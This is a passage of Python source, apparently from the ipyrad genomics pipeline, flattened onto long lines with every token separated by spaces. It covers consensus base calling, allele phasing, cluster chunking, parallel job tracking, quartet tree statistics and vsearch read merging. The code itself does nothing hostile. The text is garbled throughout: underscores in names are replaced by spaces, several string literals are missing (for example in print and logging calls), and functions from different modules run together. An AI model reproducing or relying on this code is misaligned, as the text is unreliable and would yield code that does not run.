( "\n" ) names = piece [ 0 : : 2 ] seqs = piece [ 1 : : 2 ] ## pull replicate read info from seqs reps = [ int ( sname . split ( ";" ) [ - 2 ] [ 5 : ] ) for sname in names ] ## IF this is a reference mapped read store the chrom and pos info ## -1 defaults to indicating an anonymous locus, since we are using ## the faidict as 0 indexed. If chrompos fails it defaults to -1 ref position = ( - 1 , 0 , 0 ) if isref : try : ## parse position from name string name , , = names [ 0 ] . rsplit ( ";" , 2 ) chrom , pos0 , pos1 = name . rsplit ( ":" , 2 ) ## pull idx from .fai reference dict  chromint = faidict [ chrom ] + 1 ref position = ( int ( chromint ) , int ( pos0 ) , int ( pos1 ) ) except Exception as inst : LOGGER . debug ( "Reference sequence chrom/pos failed for {}" . format ( names [ 0 ] ) ) LOGGER . debug ( inst ) ## apply read depth filter if nfilter1 ( data , reps ) : ## get stacks of base counts sseqs = [ list ( seq ) for seq in seqs ] arrayed = np . concatenate ( [ [ seq ] * rep for seq , rep in zip ( sseqs , reps ) ] ) arrayed = arrayed [ : , : maxlen ] ## get consens call for each site, applies paralog-x-site filter #consens = np.apply along axis(basecall, 0, arrayed, data) consens = basecaller ( arrayed , data . paramsdict [ "mindepth majrule" ] , data . paramsdict [ "mindepth statistical" ] , data . esth , data . este , ) ## apply a filter to remove low coverage sites/Ns that ## are likely sequence repeat errors. This is only applied to ## clusters that already passed the read-depth filter (1) if "N" in consens : try : consens , arrayed = removerepeats ( consens , arrayed ) except Value Error as : LOGGER . info ( "Caught a bad chunk w/ all Ns. Skip it." ) continue ## get hetero sites hidx = [ i for ( i , j ) in enumerate ( consens ) if j in list ( "RKSYWM" ) ] nheteros = len ( hidx ) ## filter for max number of hetero sites if nfilter2 ( nheteros , maxhet ) : ## filter for max N, & minlen if nfilter3 ( consens , maxn ) : ## counter right now current = counters [ "nconsens" ] ## get N alleles and get lower case in consens consens , nhaps = nfilter4 ( consens , hidx , arrayed ) ## store the number of alleles observed nallel [ current ] = nhaps ## store a reduced array with only CATG catg = np . array ( [ np . sum ( arrayed == i , axis = 0 ) for i in list ( "CATG" ) ] , dtype = 'uint32' ) . T catarr [ current , : catg . shape [ 0 ] , : ] = catg refarr [ current ] = ref position ## store the seqdata for tmpchunk storeseq [ counters [ "name" ] ] = "" . join ( list ( consens ) ) counters [ "name" ] += 1 counters [ "nconsens" ] += 1 counters [ "heteros" ] += nheteros else : #LOGGER.debug("@haplo") filters [ 'maxn' ] += 1 else : #LOGGER.debug("@hetero") filters [ 'maxh' ] += 1 else : #LOGGER.debug("@depth") filters [ 'depth' ] += 1 ## close infile io clusters . close ( ) ## write final consens string chunk if storeseq : with open ( consenshandle , 'wb' ) as outfile : outfile . write ( "\n" . join ( [ ">" + sample . name + " " + str ( key ) + "\n" + str ( storeseq [ key ] ) for key in storeseq ] ) ) ## write to h5 array, this can be a bit slow on big data sets and is not  ## currently convered by progressbar movement. with h5py . File ( tmp5 , 'a' ) as io5 : io5 [ "cats" ] [ : ] = catarr io5 [ "alls" ] [ : ] = nallel io5 [ "chroms" ] [ : ] = refarr del catarr del nallel del refarr ## return stats counters [ 'nsites' ] = sum ( [ len ( i ) for i in storeseq . itervalues ( ) ] ) return counters , filters
def basecaller ( arrayed , mindepth majrule , mindepth statistical , est H , est E ) : ## an array to fill with consensus site calls cons = np . zeros ( arrayed . shape [ 1 ] , dtype = np . uint8 ) cons . fill ( 78 ) arr = arrayed . view ( np . uint8 ) ## iterate over columns for col in xrange ( arr . shape [ 1 ] ) : ## the site of focus carr = arr [ : , col ] ## make mask of N and - sites mask = carr == 45 mask += carr == 78 marr = carr [ ~ mask ] ## skip if only empties (e.g., N-) if not marr . shape [ 0 ] : cons [ col ] = 78 ## skip if not variable elif np . all ( marr == marr [ 0 ] ) : cons [ col ] = marr [ 0 ] ## estimate variable site call else : ## get allele freqs (first-most, second, third = p, q, r) counts = np . bincount ( marr ) pbase = np . argmax ( counts ) nump = counts [ pbase ] counts [ pbase ] = 0 qbase = np . argmax ( counts ) numq = counts [ qbase ] counts [ qbase ] = 0 rbase = np . argmax ( counts ) numr = counts [ rbase ] ## based on biallelic depth bidepth = nump + numq if bidepth < mindepth majrule : cons [ col ] = 78 else : ## if depth is too high, reduce to sampled int if bidepth > 500 : base1 = int ( 500 * ( nump / float ( bidepth ) ) ) base2 = int ( 500 * ( numq / float ( bidepth ) ) ) else : base1 = nump base2 = numq ## make statistical base call   if bidepth >= mindepth statistical : ishet , prob = get binom ( base1 , base2 , est E , est H ) #LOGGER.info("ishet, prob, b1, b2: %s %s %s %s", ishet, prob, base1, base2) if prob < 0.95 : cons [ col ] = 78 else : if ishet : cons [ col ] = TRANS [ ( pbase , qbase ) ] else : cons [ col ] = pbase ## make majrule base call else : #if bidepth >= mindepth majrule: if nump == numq : cons [ col ] = TRANS [ ( pbase , qbase ) ] else : cons [ col ] = pbase return cons . view ( "S1" )
def nfilter1 ( data , reps ) : if sum ( reps ) >= data . paramsdict [ "mindepth majrule" ] and sum ( reps ) <= data . paramsdict [ "maxdepth" ] : return 1 else : return 0
def nfilter4 ( consens , hidx , arrayed ) : ## if less than two Hs then there is only one allele if len ( hidx ) < 2 : return consens , 1 ## store base calls for hetero sites harray = arrayed [ : , hidx ] ## remove any reads that have N or - base calls at hetero sites ## these cannot be used when calling alleles currently. harray = harray [ ~ np . any ( harray == "-" , axis = 1 ) ] harray = harray [ ~ np . any ( harray == "N" , axis = 1 ) ] ## get counts of each allele (e.g., AT:2, CG:2) ccx = Counter ( [ tuple ( i ) for i in harray ] ) ## Two possibilities we would like to distinguish, but we can't. Therefore, ## we just throw away low depth third alleles that are within seq. error. ## 1) a third base came up as a sequencing error but is not a unique allele ## 2) a third or more unique allele is there but at low frequency ## remove low freq alleles if more than 2, since they may reflect ## sequencing errors at hetero sites, making a third allele, or a new ## allelic combination that is not real. if len ( ccx ) > 2 : totdepth = harray . shape [ 0 ] cutoff = max ( 1 , totdepth // 10 ) alleles = [ i for i in ccx if ccx [ i ] > cutoff ] else : alleles = ccx . keys ( ) ## how many high depth alleles? nalleles = len ( alleles ) ## if 2 alleles then save the phase using lowercase coding if nalleles == 2 : try : consens = storealleles ( consens , hidx , alleles ) except ( Index Error , Key Error ) : ## the H sites do not form good alleles LOGGER . info ( "failed at phasing loc, skipping" ) LOGGER . info ( , consens , hidx , alleles ) return consens , nalleles ## just return the info for later filtering else : return consens , nalleles
def storealleles ( consens , hidx , alleles ) : ## find the first hetero site and choose the priority base ## example, if W: then priority base in A and not T. PRIORITY=(order: CATG) bigbase = PRIORITY [ consens [ hidx [ 0 ] ] ] ## find which allele has priority based on bigbase bigallele = [ i for i in alleles if i [ 0 ] == bigbase ] [ 0 ] ## uplow other bases relative to this one and the priority list ## e.g., if there are two hetero sites (WY) and the two alleles are ## AT and TC, then since bigbase of (W) is A second hetero site should ## be stored as y, since the ordering is swapped in this case; the priority ## base (C versus T) is C, but C goes with the minor base at h site 1. #consens = list(consens) for hsite , pbase in zip ( hidx [ 1 : ] , bigallele [ 1 : ] ) : if PRIORITY [ consens [ hsite ] ] != pbase : consens [ hsite ] = consens [ hsite ] . lower ( ) ## return consens return consens
def chunk clusters ( data , sample ) : ## counter for split job submission num = 0 ## set optim size for chunks in N clusters. The first few chunks take longer ## because they contain larger clusters, so we create 4X as many chunks as ## processors so that they are split more evenly. optim = int ( ( sample . stats . clusters total // data . cpus ) + ( sample . stats . clusters total % data . cpus ) ) ## break up the file into smaller tmp files for each engine ## chunking by cluster is a bit trickier than chunking by N lines chunkslist = [ ] ## open to clusters with gzip . open ( sample . files . clusters , 'rb' ) as clusters : ## create iterator to sample 2 lines at a time pairdealer = itertools . izip ( * [ iter ( clusters ) ] * 2 ) ## Use iterator to sample til end of cluster done = 0 while not done : ## grab optim clusters and write to file. done , chunk = clustdealer ( pairdealer , optim ) chunkhandle = os . path . join ( data . dirs . clusts , "tmp " + str ( sample . name ) + "." + str ( num * optim ) ) if chunk : chunkslist . append ( ( optim , chunkhandle ) ) with open ( chunkhandle , 'wb' ) as outchunk : outchunk . write ( "//\n//\n" . join ( chunk ) + "//\n//\n" ) num += 1 return chunkslist
def get subsamples ( data , samples , force ) : subsamples = [ ] for sample in samples : if not force : if sample . stats . state >= 5 : print ( . format ( sample . name ) ) elif not sample . stats . clusters hidepth : print ( . format ( sample . name , int ( sample . stats . clusters hidepth ) ) ) elif sample . stats . state < 4 : print ( . format ( sample . name ) ) else : subsamples . append ( sample ) else : if not sample . stats . clusters hidepth : print ( . format ( sample . name , sample . files . clusters ) ) elif sample . stats . state < 4 : print ( . format ( sample . name ) ) else : subsamples . append ( sample ) if len ( subsamples ) == 0 : raise I Pyrad Warning Exit ( ) ## if sample is already done skip if "hetero est" not in data . stats : print ( "  No estimates of heterozygosity and error rate. Using default " "values" ) for sample in subsamples : sample . stats . hetero est = 0.001 sample . stats . error est = 0.0001 if data . headers : print ( . format ( data . stats . error est . mean ( ) , data . stats . error est . std ( ) , data . stats . hetero est . mean ( ) , data . stats . hetero est . std ( ) ) ) return subsamples
def run ( data , samples , force , ipyclient ) : ## prepare dirs data . dirs . consens = os . path . join ( data . dirs . project , data . name + " consens" ) if not os . path . exists ( data . dirs . consens ) : os . mkdir ( data . dirs . consens ) ## zap any tmp files that might be leftover tmpcons = glob . glob ( os . path . join ( data . dirs . consens , "* tmpcons.*" ) ) tmpcats = glob . glob ( os . path . join ( data . dirs . consens , "* tmpcats.*" ) ) for tmpfile in tmpcons + tmpcats : os . remove ( tmpfile ) ## filter through samples for those ready samples = get subsamples ( data , samples , force ) ## set up parallel client: how many cores? lbview = ipyclient . load balanced view ( ) data . cpus = data . ipcluster [ "cores" ] if not data . cpus : data . cpus = len ( ipyclient . ids ) ## wrap everything to ensure destruction of temp files inst = "" try : ## calculate depths, if they changed. samples = calculate depths ( data , samples , lbview ) ## chunk clusters into bits for parallel processing lasyncs = make chunks ( data , samples , lbview ) ## process chunks and cleanup process chunks ( data , samples , lasyncs , lbview ) except Keyboard Interrupt as inst : raise inst finally : ## if process failed at any point delete tmp files tmpcons = glob . glob ( os . path . join ( data . dirs . clusts , "tmp *.[0-9]*" ) ) tmpcons += glob . glob ( os . path . join ( data . dirs . consens , "* tmpcons.*" ) ) tmpcons += glob . glob ( os . path . join ( data . dirs . consens , "* tmpcats.*" ) ) for tmpchunk in tmpcons : os . remove ( tmpchunk ) ## Finished step 5. Set step 6 checkpoint to 0 to force ## re-running from scratch. data . checkpoint = 0
def make chunks ( data , samples , lbview ) : ## first progress bar start = time . time ( ) printstr = " chunking clusters     | {} | s5 |" elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( 10 , 0 , printstr . format ( elapsed ) , spacer = data . spacer ) ## send off samples to be chunked lasyncs = { } for sample in samples : lasyncs [ sample . name ] = lbview . apply ( chunk clusters , * ( data , sample ) ) ## block until finished while 1 : ready = [ i . ready ( ) for i in lasyncs . values ( ) ] elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( len ( ready ) , sum ( ready ) , printstr . format ( elapsed ) , spacer = data . spacer ) time . sleep ( 0.1 ) if len ( ready ) == sum ( ready ) : print ( "" ) break ## check for failures for sample in samples : if not lasyncs [ sample . name ] . successful ( ) : LOGGER . error ( "  sample %s failed: %s" , sample . name , lasyncs [ sample . name ] . exception ( ) ) return lasyncs
def process chunks ( data , samples , lasyncs , lbview ) : ## send chunks to be processed start = time . time ( ) asyncs = { sample . name : [ ] for sample in samples } printstr = " consens calling       | {} | s5 |" ## get chunklist from results for sample in samples : clist = lasyncs [ sample . name ] . result ( ) for optim , chunkhandle in clist : args = ( data , sample , chunkhandle , optim ) #asyncs[sample.name].append(lbview.apply async(consensus, *args)) asyncs [ sample . name ] . append ( lbview . apply async ( newconsensus , * args ) ) elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( 10 , 0 , printstr . format ( elapsed ) , spacer = data . spacer ) ## track progress allsyncs = list ( itertools . chain ( * [ asyncs [ i . name ] for i in samples ] ) ) while 1 : ready = [ i . ready ( ) for i in allsyncs ] elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( len ( ready ) , sum ( ready ) , printstr . format ( elapsed ) , spacer = data . spacer ) time . sleep ( 0.1 ) if len ( ready ) == sum ( ready ) : break ## get clean samples casyncs = { } for sample in samples : rlist = asyncs [ sample . name ] statsdicts = [ i . result ( ) for i in rlist ] casyncs [ sample . name ] = lbview . apply ( cleanup , * ( data , sample , statsdicts ) ) while 1 : ready = [ i . ready ( ) for i in casyncs . values ( ) ] elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( 10 , 10 , printstr . format ( elapsed ) , spacer = data . spacer ) time . sleep ( 0.1 ) if len ( ready ) == sum ( ready ) : print ( "" ) break ## check for failures: for key in asyncs : asynclist = asyncs [ key ] for async in asynclist : if not async . successful ( ) : LOGGER . error ( "  async error: %s \n%s" , key , async . exception ( ) ) for key in casyncs : if not casyncs [ key ] . successful ( ) : LOGGER . error ( "  casync error: %s \n%s" , key , casyncs [ key ] . exception ( ) ) ## get samples back subsamples = [ i . result ( ) for i in casyncs . values ( ) ] for sample in subsamples : data . samples [ sample . name ] = sample ## build Assembly stats data . stats dfs . s5 = data . build stat ( "s5" ) ## write stats file data . stats files . s5 = os . path . join ( data . dirs . consens , 's5 consens stats.txt' ) with io . open ( data . stats files . s5 , 'w' ) as out : #out.write(data.stats dfs.s5.to string()) data . stats dfs . s5 . to string ( buf = out , formatters = { 'clusters total' : '{:.0f}' . format , 'filtered by depth' : '{:.0f}' . format , 'filtered by max H' : '{:.0f}' . format , 'filtered by max N' : '{:.0f}' . format , 'reads consens' : '{:.0f}' . format , 'nsites' : '{:.0f}' . format , 'nhetero' : '{:.0f}' . format , 'heterozygosity' : '{:.5f}' . format } )
def make ( data , samples ) : #read in loci file outfile = open ( os . path . join ( data . dirs . outfiles , data . name + ".alleles" ) , 'w' ) lines = open ( os . path . join ( data . dirs . outfiles , data . name + ".loci" ) , 'r' ) ## Get the longest sample name for pretty printing longname = max ( len ( x ) for x in data . samples . keys ( ) ) ## Padding between name and sequence in output file. This should be the  ## same as write outfiles.write tmp loci.name padding name padding = 5 writing = [ ] loc = 0 for line in lines : if ">" in line : name , seq = line . split ( " " ) [ 0 ] , line . split ( " " ) [ - 1 ] allele1 , allele2 = splitalleles ( seq . strip ( ) ) ## Format the output string. the "-2" below accounts for the additional ## 2 characters added to the sample name that don't get added to the ## snpsites line, so you gotta bump this line back 2 to make it ## line up right. writing . append ( name + " 0" + " " * ( longname - len ( name ) - 2 + name padding ) + allele1 ) writing . append ( name + " 1" + " " * ( longname - len ( name ) - 2 + name padding ) + allele2 ) else : writing . append ( line . strip ( ) ) loc += 1 ## print every 10K loci " if not loc % 10000 : outfile . write ( "\n" . join ( writing ) + "\n" ) writing = [ ] outfile . write ( "\n" . join ( writing ) ) outfile . close ( )
def cluster info ( ipyclient , spacer = "" ) : ## get engine data, skips busy engines.     hosts = [ ] for eid in ipyclient . ids : engine = ipyclient [ eid ] if not engine . outstanding : hosts . append ( engine . apply ( socket . gethostname ) ) ## report it hosts = [ i . get ( ) for i in hosts ] result = [ ] for hostname in set ( hosts ) : result . append ( "{}host compute node: [{} cores] on {}" . format ( spacer , hosts . count ( hostname ) , hostname ) ) print "\n" . join ( result )
def set debug dict ( loglevel ) : lconfig . dict Config ( { 'version' : 1 , 'disable existing loggers' : False , 'formatters' : { 'standard' : { 'format' : "%(asctime)s \t" + "pid=%(process)d \t" + "[%(filename)s]\t" + "%(levelname)s \t" + "%(message)s" } , } , 'handlers' : { name : { 'level' : loglevel , 'class' : 'logging.File Handler' , 'filename' : debugfile , 'formatter' : "standard" , 'mode' : 'a+' } } , 'loggers' : { name : { 'handlers' : [ name ] , 'level' : loglevel , 'propogate' : True } } } )
def debug off ( ) : if os . path . exists ( debugflag ) : os . remove ( debugflag ) loglevel = "ERROR" LOGGER . info ( "debugging turned off" ) set debug dict ( loglevel )
def cmd exists ( cmd ) : return subprocess . call ( "type " + cmd , shell = True , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) == 0
def random product ( iter1 , iter2 ) : iter4 = np . concatenate ( [ np . random . choice ( iter1 , 2 , replace = False ) , np . random . choice ( iter2 , 2 , replace = False ) ] ) return iter4
def get total ( tots , node ) : if ( node . is leaf ( ) or node . is root ( ) ) : return 0 else : ## Get counts on down edges.  ## How to treat polytomies here? if len ( node . children ) > 2 : down r = node . children [ 0 ] down l = node . children [ 1 ] for child in node . children [ 2 : ] : down l += child else : down r , down l = node . children lendr = sum ( 1 for i in down r . iter leaves ( ) ) lendl = sum ( 1 for i in down l . iter leaves ( ) ) ## get count on up edge sister up r = node . get sisters ( ) [ 0 ] lenur = sum ( 1 for i in up r . iter leaves ( ) ) ## everyone else lenul = tots - ( lendr + lendl + lenur ) ## return product return lendr * lendl * lenur * lenul
def get sampled ( data , totn , node ) : ## convert tip names to ints names = sorted ( totn ) cdict = { name : idx for idx , name in enumerate ( names ) } ## skip some nodes if ( node . is leaf ( ) or node . is root ( ) ) : return 0 else : ## get counts on down edges if len ( node . children ) > 2 : down r = node . children [ 0 ] down l = node . children [ 1 ] for child in node . children [ 2 : ] : down l += child else : down r , down l = node . children lendr = set ( cdict [ i ] for i in down r . get leaf names ( ) ) lendl = set ( cdict [ i ] for i in down l . get leaf names ( ) ) ## get count on up edge sister up r = node . get sisters ( ) [ 0 ] lenur = set ( cdict [ i ] for i in up r . get leaf names ( ) ) ## everyone else lenul = set ( cdict [ i ] for i in totn ) - set . union ( lendr , lendl , lenur ) idx = 0 sampled = 0 with h5py . File ( data . database . output , 'r' ) as io5 : end = io5 [ "quartets" ] . shape [ 0 ] while 1 : ## break condition if idx >= end : break ## counts matches qrts = io5 [ "quartets" ] [ idx : idx + data . chunksize ] for qrt in qrts : sqrt = set ( qrt ) if all ( [ sqrt . intersection ( i ) for i in [ lendr , lendl , lenur , lenul ] ] ) : sampled += 1 ## increase span idx += data . chunksize return sampled
def run qmc ( self , boot ) : ## build command self . tmp = os . path . join ( self . dirs , ".tmptre" ) cmd = [ ip . bins . qmc , "qrtt=" + self . files . qdump , "otre=" + self . tmp ] ## run it proc = subprocess . Popen ( cmd , stderr = subprocess . STDOUT , stdout = subprocess . PIPE ) res = proc . communicate ( ) if proc . returncode : raise I Pyrad Warning Exit ( res [ 1 ] ) ## parse tmp file written by qmc into a tree and rename it with open ( self . tmp , 'r' ) as intree : tre = ete3 . Tree ( intree . read ( ) . strip ( ) ) names = tre . get leaves ( ) for name in names : name . name = self . samples [ int ( name . name ) ] tmptre = tre . write ( format = 9 ) ## save the tree to file if boot : self . trees . boots = os . path . join ( self . dirs , self . name + ".boots" ) with open ( self . trees . boots , 'a' ) as outboot : outboot . write ( tmptre + "\n" ) else : self . trees . tree = os . path . join ( self . dirs , self . name + ".tree" ) with open ( self . trees . tree , 'w' ) as outtree : outtree . write ( tmptre ) ## save the file self . save ( )
def compute stats ( self , start , ipyclient , quiet = False ) : ## get name indices names = self . samples ## make a consensus from bootstrap reps. if self . checkpoint . boots : tre = ete3 . Tree ( self . trees . tree , format = 0 ) tre . unroot ( ) with open ( self . trees . boots , 'r' ) as inboots : bb = [ ete3 . Tree ( i . strip ( ) , format = 0 ) for i in inboots . readlines ( ) ] bb = [ tre ] + bb ## calculate consensus supports ctre , counts = consensus tree ( bb , names = names ) self . trees . cons = os . path . join ( self . dirs , self . name + ".cons" ) with open ( self . trees . cons , 'w' ) as ocons : ocons . write ( ctre . write ( format = 0 ) ) else : ctre = ete3 . Tree ( self . trees . tree , format = 0 ) ctre . unroot ( ) ## build stats file and write trees self . trees . nhx = os . path . join ( self . dirs , self . name + ".nhx" ) lbview = ipyclient . load balanced view ( ) qtots = { } qsamp = { } tots = sum ( 1 for i in ctre . iter leaves ( ) ) totn = set ( ctre . get leaf names ( ) ) ## iterate over node traversal for node in ctre . traverse ( ) : ## this is slow, needs to look at every sampled quartet ## so we send it to be processed on engines qtots [ node ] = lbview . apply ( get total , * ( tots , node ) ) qsamp [ node ] = lbview . apply ( get sampled , * ( self , totn , node ) ) ## wait for jobs to finish (+1 to lenjob is for final progress printer) alljobs = qtots . values ( ) + qsamp . values ( ) lenjobs = len ( alljobs ) + 1 printstr = "calculating stats | {} | " done = 0 while 1 : if not quiet : done = sum ( [ i . ready ( ) for i in alljobs ] ) elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( lenjobs , done , printstr . format ( elapsed ) , spacer = "" ) if ( lenjobs - 1 ) == done : break else : time . sleep ( 0.1 ) ## store results in the tree object for node in ctre . traverse ( ) : total = qtots [ node ] . result ( ) sampled = qsamp [ node ] . result ( ) node . add feature ( "quartets total" , total ) node . add feature ( "quartets sampled" , sampled ) features = [ "quartets total" , "quartets sampled" ] ## update final progress elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( 1 , 1 , printstr . format ( elapsed ) , spacer = "" ) if not quiet : print ( "" ) ## write tree in NHX format  with open ( self . trees . nhx , 'w' ) as outtre : outtre . write ( ctre . write ( format = 0 , features = features ) )
def load ( self , name , workdir , quiet = False ) : ## load the JSON string and try with name+.json path = os . path . join ( workdir , name ) if not path . endswith ( ".tet.json" ) : path += ".tet.json" ## expand user path = path . replace ( "~" , os . path . expanduser ( "~" ) ) ## load the json file as a dictionary try : with open ( path , 'r' ) as infile : fullj = byteify ( json . loads ( infile . read ( ) , object hook = byteify ) , ignore dicts = True ) except IO Error : raise I Pyrad Warning Exit ( . format ( path ) ) ## set old attributes into new tetrad object self . name = fullj [ "name" ] self . files . data = fullj [ "files" ] [ "data" ] self . files . mapfile = fullj [ "files" ] [ "mapfile" ] self . dirs = fullj [ "dirs" ] self . init seqarray ( quiet = quiet ) self . parse names ( ) ## fill in the same attributes for key in fullj : ## fill Params a little different if key in [ "files" , "params" , "database" , "trees" , "stats" , "checkpoint" ] : filler = fullj [ key ] for ikey in filler : self . dict [ key ] . setattr ( ikey , fullj [ key ] [ ikey ] ) else : self . setattr ( key , fullj [ key ] )
def insert to array ( self , chunk , results ) : ## two result arrs chunksize = self . chunksize qrts , invs = results ## enter into db with h5py . File ( self . database . output , 'r+' ) as io5 : io5 [ 'quartets' ] [ chunk : chunk + chunksize ] = qrts ## entered as 0-indexed ! if self . params . save invariants : if self . checkpoint . boots : key = "invariants/boot{}" . format ( self . checkpoint . boots ) io5 [ key ] [ chunk : chunk + chunksize ] = invs else : io5 [ "invariants/boot0" ] [ chunk : chunk + chunksize ] = invs
def memoize ( func ) : class Memodict ( dict ) : """ just a dict""" def getitem ( self , * key ) : return dict . getitem ( self , key ) def missing ( self , key ) : """ this makes it faster """ ret = self [ key ] = func ( * key ) return ret return Memodict ( ) . getitem
def comp ( seq ) : ## makes base to its small complement then makes upper return seq . replace ( "A" , 't' ) . replace ( 'T' , 'a' ) . replace ( 'C' , 'g' ) . replace ( 'G' , 'c' ) . replace ( 'n' , 'Z' ) . upper ( ) . replace ( "Z" , "n" )
def fastq touchup for vsearch merge ( read , outfile , reverse = False ) : counts = 0 with open ( outfile , 'w' ) as out : ## read in paired end read files 4 lines at a time if read . endswith ( ".gz" ) : fr1 = gzip . open ( read , 'rb' ) else : fr1 = open ( read , 'rb' ) quarts = itertools . izip ( * [ iter ( fr1 ) ] * 4 ) ## a list to store until writing writing = [ ] while 1 : try : lines = quarts . next ( ) except Stop Iteration : break if reverse : seq = lines [ 1 ] . strip ( ) [ : : - 1 ] else : seq = lines [ 1 ] . strip ( ) writing . append ( "" . join ( [ lines [ 0 ] , seq + "\n" , lines [ 2 ] , "B" * len ( seq ) ] ) ) ## write to disk counts += 1 if not counts % 1000 : out . write ( "\n" . join ( writing ) + "\n" ) writing = [ ] if writing : out . write ( "\n" . join ( writing ) ) out . close ( ) fr1 . close ( )
def merge pairs after refmapping ( data , two files , merged out ) : ## create temp files  nonmerged1 = tempfile . Named Temporary File ( mode = 'wb' , dir = data . dirs . edits , suffix = " nonmerged R1 .fastq" ) . name nonmerged2 = tempfile . Named Temporary File ( mode = 'wb' , dir = data . dirs . edits , suffix = " nonmerged R2 .fastq" ) . name ## get the maxn and minlen values minlen = str ( max ( 32 , data . paramsdict [ "filter min trim len" ] ) ) try : maxn = sum ( data . paramsdict [ 'max low qual bases' ] ) except Type Error : maxn = data . paramsdict [ 'max low qual bases' ] ## set the quality scores abritrarily high and orient R2 correctly tmp1 = two files [ 0 ] [ 0 ] tmp2 = two files [ 0 ] [ 1 ] fastq touchup for vsearch merge ( tmp1 , tmp1 + ".tu" , False ) fastq touchup for vsearch merge ( tmp2 , tmp2 + ".tu" , True ) ## command string to call vsearch cmd = [ ipyrad . bins . vsearch , "--fastq mergepairs" , tmp1 + ".tu" , "--reverse" , tmp2 + ".tu" , "--fastqout" , merged out , "--fastqout notmerged fwd" , nonmerged1 , "--fastqout notmerged rev" , nonmerged2 , "--fasta width" , "0" , "--fastq minmergelen" , minlen , "--fastq maxns" , str ( maxn ) , "--fastq minovlen" , "10" , "--fastq maxdiffs" , "4" , "--label suffix" , " m1" , "--fastq qmax" , "1000" , "--threads" , "2" , "--fastq allowmergestagger" ] ## run vsearch but allow kbd proc = sps . Popen ( cmd , stderr = sps . STDOUT , stdout = sps . PIPE ) try : res = proc . communicate ( ) [ 0 ] except Keyboard Interrupt : proc . kill ( ) ## cleanup tmp files if job failed or stopped     if proc . returncode : LOGGER . error ( "Error: %s %s" , cmd , res ) raise I Pyrad Warning Exit ( "Error merge pairs:\n %s\n%s" , cmd , res ) ## record how many read pairs were merged with open ( merged out , 'r' ) as tmpf : nmerged = sum ( 1 for i in tmpf . readlines ( ) ) // 4 ## Concat unmerged pairs with a 'nnnn' separator with open ( merged out , 'ab' ) as combout : ## read in paired end read files 4 lines at a time fr1 = open ( nonmerged1 , 'rb' ) quart1 = itertools . izip ( * [ iter ( fr1 ) ] * 4 ) fr2 = open ( nonmerged2 , 'rb' ) quart2 = itertools . izip ( * [ iter ( fr2 ) ] * 4 ) quarts = itertools . izip ( quart1 , quart2 ) ## a list to store until writing writing = [ ] counts = 0 ## iterate until done while 1 : try : read1s , read2s = quarts . next ( ) except Stop Iteration : break ## store the read writing . append ( "" . join ( [ read1s [ 0 ] , read1s [ 1 ] . strip ( ) + "nnnn" + read2s [ 1 ] , read1s [ 2 ] , read1s [ 3 ] . strip ( ) + "nnnn" + read2s [ 3 ] , ] ) ) ## count up until time to write counts += 1 if not counts % 10 : combout . write ( "" . join ( writing ) ) writing = [ ] ## write the remaining if writing : combout . write ( "" . join ( writing ) ) ## close handles fr1 . close ( ) fr2 . close ( ) combout . close ( ) ## remove temp files (or do this later) rmfiles = [ nonmerged1 , nonmerged2 , tmp1 , tmp2 , tmp1 + ".tu" , tmp2 + ".tu" ] for rmfile in rmfiles : if os . path . exists ( rmfile ) : os . remove ( rmfile ) return nmerged
def revcomp ( sequence ) : sequence = sequence [ : : - 1 ] . strip ( ) . replace ( "A" , "t" ) . replace ( "T" , "a" ) . replace ( "C" , "g" ) . replace ( "G" , "c" ) . upper ( ) return sequence
def clustdealer ( pairdealer , optim ) : ccnt = 0 chunk = [ ] while ccnt < optim : ## try refreshing taker, else quit try : taker = itertools . takewhile ( lambda x : x [ 0 ] != "//\n" , pairdealer ) oneclust = [ "" . join ( taker . next ( ) ) ] except Stop Iteration : #LOGGER.debug('last chunk %s', chunk) return 1 , chunk ## load one cluster while 1 : try : oneclust . append ( "" . join ( taker . next ( ) ) ) except Stop Iteration : break chunk . append ( "" . join ( oneclust ) ) ccnt += 1 return 0 , chunk
def progressbar ( njobs , finished , msg = "" , spacer = "  " ) : if njobs : progress = 100 * ( finished / float ( njobs ) ) else : progress = 100 hashes = '#' * int ( progress / 5. ) nohash = ' ' * int ( 20 - len ( hashes ) ) if not ipyrad . interactive : msg = msg . rsplit ( "|" , 2 ) [ 0 ] args = [ spacer , hashes + nohash , int ( progress ) , msg ] print ( "\r{}[{}] {:>3}% {} " . format ( * args ) , end = "" ) sys . stdout . flush ( )
def get threaded view ( ipyclient , split = True ) : ## engine ids ## e.g., [0, 1, 2, 3, 4, 5, 6, 7, 8] eids = ipyclient . ids ## get host names ## e.g., ['a', 'a', 'b', 'b', 'a', 'c', 'c', 'c', 'c'] dview = ipyclient . direct view ( ) hosts = dview . apply sync ( socket . gethostname ) ## group ids into a dict by their hostnames ## e.g., {a: [0, 1, 4], b: [2, 3], c: [5, 6, 7, 8]} hostdict = defaultdict ( list ) for host , eid in zip ( hosts , eids ) : hostdict [ host ] . append ( eid ) ## Now split threads on the same host into separate proc if there are many hostdictkeys = hostdict . keys ( ) for key in hostdictkeys : gids = hostdict [ key ] maxt = len ( gids ) if len ( gids ) >= 4 : maxt = 2 ## if 4 nodes and 4 ppn, put one sample per host if ( len ( gids ) == 4 ) and ( len ( hosts ) >= 4 ) : maxt = 4 if len ( gids ) >= 6 : maxt = 3 if len ( gids ) >= 8 : maxt = 4 if len ( gids ) >= 16 : maxt = 4 ## split ids into groups of maxt threaded = [ gids [ i : i + maxt ] for i in xrange ( 0 , len ( gids ) , maxt ) ] lth = len ( threaded ) ## if anything was split (lth>1) update hostdict with new proc if lth > 1 : hostdict . pop ( key ) for hostid in range ( lth ) : hostdict [ str ( key ) + " " + str ( hostid ) ] = threaded [ hostid ] ## make sure split numbering is correct #threaded = hostdict.values() #assert len(ipyclient.ids) <= len(list(itertools.chain(*threaded))) LOGGER . info ( "threaded view: %s" , dict ( hostdict ) ) return hostdict
